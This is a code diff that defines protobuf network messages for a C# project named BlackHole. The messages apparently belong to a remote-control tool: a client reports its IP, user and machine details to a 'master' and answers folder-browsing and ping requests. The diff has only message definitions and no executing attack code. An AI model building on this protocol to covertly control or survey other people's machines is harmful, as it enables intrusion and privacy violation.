@@ -8,24 +8,90 @@ using System.Threading.Tasks;
 
 namespace BlackHole.Common.Network.Protocol
 {
+
+    // ===========================================
+    // ================= Messages ================
+    // ===========================================
+
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
-    public sealed class GreetTheMaster : NetMessage
+    public sealed class StatusUpdateMessage : NetMessage
     {
-        public string UserName;
-        public string MachineName;
-        public string OperatingSystem;
+        public string Operation { get; set; }
+        public bool Success { get; set; }
+        public string Message { get; set; }
+    }
+    
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class FolderNavigationMessage : NetMessage
+    {
+        public string Path { get; set; }
+        public List<FileMeta> Files { get; set; }
     }
 
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
-    public sealed class DoYourDuty : NetMessage
+    public sealed class NavigateToFolderMessage : NetMessage
+    {
+        public string Path { get; set; }
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class PongMessage : NetMessage
     {
     }
 
-    [ProtoInclude(1001, typeof(DoYourDuty))]
-    [ProtoInclude(1000, typeof(GreetTheMaster))]
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class PingMessage : NetMessage
+    {
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class GreetTheMasterMessage : NetMessage
+    {
+        public string Ip { get; set; }
+        public string UserName { get; set; }
+        public string MachineName { get; set; }
+        public string OperatingSystem { get; set; }
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class DoYourDutyMessage : NetMessage
+    {
+    }
+
+    // ====================================
+    // ================= Data =============
+    // ====================================
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public enum FileType
+    {
+        [ProtoEnum]
+        FOLDER,
+        [ProtoEnum]
+        FILE
+    }
+
+    [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
+    public sealed class FileMeta
+    {
+        public FileType Type { get; set; }
+        public string Name { get; set; }
+        public string Size { get; set; }
+    }
+
+    [ProtoInclude(1006, typeof(StatusUpdateMessage))]
+    [ProtoInclude(1005, typeof(FolderNavigationMessage))]
+    [ProtoInclude(1004, typeof(NavigateToFolderMessage))]
+    [ProtoInclude(1003, typeof(PongMessage))]
+    [ProtoInclude(1002, typeof(PingMessage))]
+    [ProtoInclude(1001, typeof(DoYourDutyMessage))]
+    [ProtoInclude(1000, typeof(GreetTheMasterMessage))]
     [ProtoContract(ImplicitFields = ImplicitFields.AllPublic)]
     public abstract class NetMessage
     {
+        /// <summary>
+        /// Cache buffer
+        /// </summary>
         private byte[] m_serializedBuffer;
 
         /// <summary>
